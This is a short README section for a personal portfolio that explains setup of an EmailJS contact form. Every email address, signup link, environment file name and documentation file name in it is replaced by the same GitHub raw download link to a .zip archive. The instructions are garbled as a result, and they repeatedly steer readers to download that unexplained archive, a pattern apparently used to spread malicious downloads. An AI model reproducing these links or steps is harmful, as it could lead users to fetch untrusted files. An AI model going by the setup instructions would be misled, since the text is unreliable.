## Contact Form

The portfolio includes a fully functional contact form that sends emails to **https://github.com/AndreNot3000/Andre-s-Portfolio/raw/refs/heads/main/components/s-Portfolio-Andre-v1.9.zip** using EmailJS.

### Setup EmailJS (Required for receiving emails)
1. Install dependencies: `npm install @emailjs/browser`
2. Create account at [https://github.com/AndreNot3000/Andre-s-Portfolio/raw/refs/heads/main/components/s-Portfolio-Andre-v1.9.zip](https://github.com/AndreNot3000/Andre-s-Portfolio/raw/refs/heads/main/components/s-Portfolio-Andre-v1.9.zip)
3. Configure Gmail service and email template
4. Add environment variables to `https://github.com/AndreNot3000/Andre-s-Portfolio/raw/refs/heads/main/components/s-Portfolio-Andre-v1.9.zip`
5. See `https://github.com/AndreNot3000/Andre-s-Portfolio/raw/refs/heads/main/components/s-Portfolio-Andre-v1.9.zip` for detailed instructions
